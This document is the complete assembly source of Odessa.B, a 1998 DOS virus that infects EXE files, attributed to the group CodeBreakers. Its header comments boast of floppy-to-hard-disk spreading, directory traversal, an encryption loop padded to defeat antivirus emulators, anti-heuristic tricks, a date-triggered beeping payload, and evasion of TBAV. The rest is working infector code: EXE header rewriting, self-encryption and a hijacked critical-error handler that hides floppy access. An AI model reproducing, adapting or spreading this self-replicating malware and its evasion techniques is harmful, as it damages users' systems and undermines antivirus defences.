;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;                              Odessa.B virus
;                       (C) Opic [CodeBreakers '98]
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;Odessa.B variant is a continuation of Odessa (aka opic.727)
;
;Odessa.B's NEW features:
;
;-Odessa.B will NOW infect .Exe files present on any floppy disks 
; undetectably (due to a critical error handler).  It does so after
; the current HDD is infected. When Odessa.B is present on a floppy
; disk it will move imediatly to the HDD to insure infection of new systems.
;Thus making it a viable floppy born virus (one of the few outside of the
;BS/MBR families)
;
;-an expanded encryption loop 
;
;-some minor bug fixes, and optimisations. 
;
;Infected files grow approximatly: 745 bytes
;
;Old features:
;
;-Exe file infector 
;-directory transversal via dotdot
;-is Windows compatable (ie: will not infect: Windows NE, PE, LE files ect.)

;-some anti-emulation
;-payload criteria: the virus will activate its payload on 
; either the 13th or the 6th of any given month provided the seconds
; are below 30.
;
;-payload: when activated the virus will beep 6 times before the 
; infected file is run. I choose this more subtle payload because
;it is easily missed, and only creates a bit of curiosity at most.
;which is a good aspect since the fact that all infected files will
;try to access the floppy drive before running also brings some curious.
;Its also somewhat humerous because the telltale signs of this virus
;are also what many non-computer literate people constantly write to
;AVers about complaining of (to which the AVs constant reply is:
;false alarm. There is a signature line:
;Odessa.B (c) Opic [Codebreakers 1998] 
;I have left for the AV to rename for me, as it is never displayed 
;(hell i figure their gonna anyways :P ).
;
;detected: Not detected by TBAV as second gen. 
;
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Exe_Infector  Segment
              Assume CS:Exe_Infector, SS:Exe_Infector, DS:Exe_Infector, ES:Exe_Infector
              jumps
start:                             ;set registers up

                dec cx               ;lame loop
noav1:
                jmp noav2
                mov ax,4c00h
                int 21h
noav2:
                loop noav1           ;end of antiheur

                push ds
                push es
                push cs
                push cs
                pop ds
                pop es
                Call delta

delta:                             ;delta offset
                pop bp
                sub bp,offset delta
                lea si,[bp+Begin_Virus]
                mov di,si
                mov cx,End_Virus-Begin_Virus
                call encrypt
                jmp Begin

encrypt:
                lodsb
                NEG al    ;<-------------13
                ROR al,4  ;<------------12
                NOT al    ;<-----------11
                ROR al,4  ;<----------10
                NOT al    ;<---------9
                NEG al    ;<--------8
                ROL al,4  ;<-------7
                NOT al    ;<------6
                ROL al,4  ;<-----5
                NOT al    ;<----4
                ROR al,4  ;<---3
                NEG al    ;<--2
                NOT al    ;<-1
                ROR al,4  ;<0            this huge loop may
                NOT al    ;<-1           look silly but it
                NEG al    ;<--2          kills alot of AV
                ROR al,4  ;<---3         scanners due becuz
                NOT al    ;<----4        they think it is
                ROL al,4  ;<-----5       endless
                NOT al    ;<------6
                ROL al,4  ;<-------7
                NEG al    ;<--------8
                NOT al    ;<---------9
                ROR al,4  ;<----------10
                NOT al    ;<-----------11
                ROR al,4  ;<------------12
                NEG al    ;<-------------13
                stosb
                loop encrypt
                ret
Begin_Virus:

Check_Payload proc
                mov ah,2ah          ;system date
                int 21h
                cmp dl,13           ;is it the 31st if the month?
                je sec              ;yes? test seconds!
                cmp dl,6            ;13th ?
                je sec              ;yes seconds!
                jmp CP_Exit         ;no? restore.
sec:
                mov ah,2Ch         ;check time
                int 21h
                cmp dh,30d         ;seconds less then 30?
                jnb CP_Exit        ;if yes->payload
                call Payload

CP_Exit:
                ret
Check_Payload endp

Payload       proc

                mov ah,0eh           ;back to c:\
                mov dl,02h
                int 21h

                mov cx,6         ;beep 6 times.
beep:
                mov al,7
                int 29h
                loop beep        
                ret
Payload       endp

Infect        proc
                mov ax,3d02h  ;open file
                lea dx,[bp+End_Virus+1eh]
                int 21h

                mov bx,ax ;file handleto bx
                mov ah,3fh  ;exe head into buffer
                lea dx,[bp+header]
                mov cx,1ah
                int 21h

                cmp word ptr cs:[bp+header],'MZ'  ;check .exe signature
                je its_exe
                cmp word ptr cs:[bp+header],'ZM'
                je its_exe
                jmp close

its_exe:
                cmp byte ptr cs:[bp+header+12h],'B'  ;our infection check
                jne not_infected
                jmp close

not_infected:
                mov ax, word ptr cs:[bp+header+18h]  ;make sure its not a
                                                     ;windbloze exe (pe,ne,le .ect)
                cmp ax, 40h
                jae close                            ; > or =  means windbloze

                mov ax,word ptr cs:[bp+header+0eh] ;save orginal info from header
                mov word ptr cs:[bp+old_ss],ax  ;stack segment
                mov ax,word ptr cs:[bp+header+10h] ;stack pointer
                mov word ptr cs:[bp+old_sp],ax

                mov ax,word ptr cs:[bp+header+14h] ;instructional pointer
                mov word ptr cs:[bp+old_ip],ax

                mov ax,word ptr cs:[bp+header+16h]  ;code segment
                mov word ptr cs:[bp+old_cs],ax  ;cs:ip =begining of excutable code

                mov ax,4202h   ;EOF
                xor cx,cx
                xor dx,dx
                int 21h

                push ax ;save file size
                push dx
                push ax

                mov ax,word ptr cs:[bp+header+8] ;header size
                shl ax,4                         ;convert
                mov cx,ax     ;save header size in cx
                pop ax     ;restore ax
                sub ax,cx   ;subtract header from file size to get code and data size
                sbb dx,0

                mov cx,10h
                div cx

                mov word ptr cs:[bp+header+14h],dx ;IP create new header
                mov word ptr cs:[bp+header+16h],ax ;CS
                mov word ptr cs:[bp+header+0Eh],ax ;SS
                mov word ptr cs:[bp+header+10h],0fffeh ;SP
                mov word ptr cs:[bp+header+12h],'B' ;marker

                pop dx   ;restore filesize
                pop ax   ;dx to ax

                add ax,End_Virus-start
                adc dx,0

                mov cx,512       ;divide new filesize by 512
                div cx

                cmp dx,0
                je no_remainder
                inc ax

no_remainder:
                mov word ptr cs:[bp+header+4],ax  ;save new filesize
                mov word ptr cs:[bp+header+2],dx

                lea si,[bp+Begin_Virus]     ;crypt virus
                lea di,[bp+Buffer]
                mov cx,End_Virus - Begin_Virus
                call encrypt

                mov ah,40h              ;write decryptor
                mov cx,Begin_Virus - start
                lea dx,[bp+start]
                int 21h

                mov ah,40h              ;write encrypted portion
                mov cx,End_Virus - Begin_Virus
                lea dx,[bp+Buffer]
                int 21h

                mov ax,4200h   ;SOF
                xor cx,cx
                xor dx,dx
                int 21h

                mov ah,40h              ;write new header
                lea dx,[bp+header]
                mov cx,1ah
                int 21h
close:
                mov ah,3eh
                int 21h
                ret
Infect        endp

ni24h         proc         ;
                mov al,3   ;ignore error
                iret       ;critical error handler
ni24h         endp

Search        proc
                mov ax,3524h      ;critical error handler
                int 21h
                push bx           ;saves orig
                push es           ;stuffs to restore later

                mov ah,25h
                lea dx,[bp+ni24h]
                int 21h

                push ds           ;ES was changed by 3524h but you need it
                pop es            ;to be restored for the crypt procedure.

first:
                mov ah,4eh ;find first
                lea dx,[bp+filespec]
                mov cx,7

findnext:
                int 21h
                jc findover        ;no? get out!
                call Infect        ;yes and infect!
                mov ah,4fh ;find next
                jmp findnext
findover:
                mov ah,3Bh         ;change dirs
                lea dx,[bp+dotdot] ;to root
                int 21h            ;now
                jnc first          ;find first file
              
get_cur_drive:
                mov ah,19h         ;what drive are we on?
                int 21h
                cmp al,00h         ;if already floppy
                je Search_Exit     ;we can leave now.

                mov ah,0eh         ;select default drive
                mov dl,00h         ;this time the floppy drive
                int 21h
                jmp first          ;exe on floppy?
Search_Exit:
                pop ds
                pop dx
                mov ax,2524h
                int 21h
                ret
Search        endp

Begin         proc
                mov ah,2fh  ;get current dta
                int 21h
                push es     ;save it
                push bx
                push cs     ;restore es
                pop es

                mov ah,1ah  ;set new dta to end of virus
                lea dx,[bp+End_Virus]
                int 21h

                mov ah,0eh  ;select default drive (main HDD)
                mov dl,02h  ;c:\
                int 21h     ;so our virus can move from
                            ;a floppy to a new HDD without
                            ;any help

                lea si,[bp+old_ip]
                lea di,[bp+original_ip]
                mov cx,4
                rep movsw

                call Search
                call Check_Payload

                mov ah,0eh           ;back to c:\
                mov dl,02h
                int 21h

restore:                             ;restore prev location DTA
                pop dx
                pop ds

                mov ah,1ah           ;reset dta
                int 21h

                pop ds
                pop es
                mov ax,es            ;es points to PSP
                add ax,10h
                add word ptr cs:[bp+original_cs],ax

                cli                  ;ints off!
                add ax,word ptr cs:[bp+original_ss]
                mov ss,ax
                mov sp,word ptr cs:[bp+original_sp]
                sti                  ;ints on!
Begin         endp

              db 0eah
original_ip   dw ?
original_cs   dw ?
original_ss   dw ?
original_sp   dw ?

old_ip        dw offset Exit
old_cs        dw 0000h
old_ss        dw 0000h
old_sp        dw 0fffeh
filespec      db '*.exe',0 
dotdot        db '..',0
sig           db 'Odessa.B (c) Opic [Codebreakers 1998]',0   
header        db 1ah DUP(?)
End_Virus     db 42 dup(?)
Buffer        equ this byte+80h

              db 1024 dup(?)

Entry         proc
                mov bp,0000h
                push ds
                push es
                push cs
                pop ds
                push cs
                pop es
                jmp Begin
Entry         endp

Exit          proc     ;<- Begin procedure
                mov ax,4c00H
                int 21h
Exit          endp     ;<- End procedure

Exe_Infector  Ends
End Entry













